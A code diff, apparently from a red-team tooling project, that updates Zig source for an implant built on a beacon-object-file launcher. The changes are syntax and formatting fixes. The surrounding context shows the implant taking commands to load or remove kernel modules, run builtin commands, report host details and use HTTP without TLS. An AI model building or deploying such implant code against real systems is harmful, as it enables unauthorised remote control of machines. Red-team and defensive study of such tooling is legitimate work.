@@ -2,7 +2,7 @@ const std = @import("std");
 const assert = std.debug.assert;
 const bof = @import("bof_launcher_api");
 
-pub const std_options = .{
+pub const std_options = std.Options{
     .http_disable_tls = true,
     .log_level = .info,
 };
@@ -21,7 +21,7 @@ const ImplantActions = struct {
     kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,
 
     pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
-        const fields = @typeInfo(Self).Struct.fields;
+        const fields = @typeInfo(Self).@"struct".fields;
 
         var ptr_table: [fields.len]usize = undefined;
 
@@ -98,7 +98,7 @@ const State = struct {
         const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
         const arch_name = target.cpu.model.name;
         var os_release = @tagName(target.os.tag);
-        if(native_os != .windows) {
+        if (native_os != .windows) {
             const utsn: std.posix.utsname = std.posix.uname();
             os_release = &utsn.release;
         }
@@ -365,7 +365,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
                     .launcher_error_code = @abs(@intFromError(err)) - 1000,
                 });
             };
-        // tasked for kernel module loading?
+            // tasked for kernel module loading?
         } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
             if (implant_actions.kmodLoad == null) {
                 std.log.info("Kernel module loading not implemented", .{});
@@ -379,7 +379,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
             std.log.info("Loading kernel module: {s}", .{cmd_name});
             _ = implant_actions.kmodLoad.?(kmod_content.ptr, kmod_content.len, "paaarams");
         } else if (std.mem.eql(u8, cmd_prefix, "kmodrm")) {
-           if (implant_actions.kmodLoad == null) {
+            if (implant_actions.kmodLoad == null) {
                 std.log.info("Kernel module loading not implemented", .{});
                 return error.BadData;
             }
@@ -387,7 +387,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
             std.log.info("Removing kernel module: {s}", .{cmd_name});
             _ = implant_actions.kmodRemove.?(@ptrCast(cmd_name.ptr), 0);
 
-        // tasked for custom command execution?
+            // tasked for custom command execution?
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
 
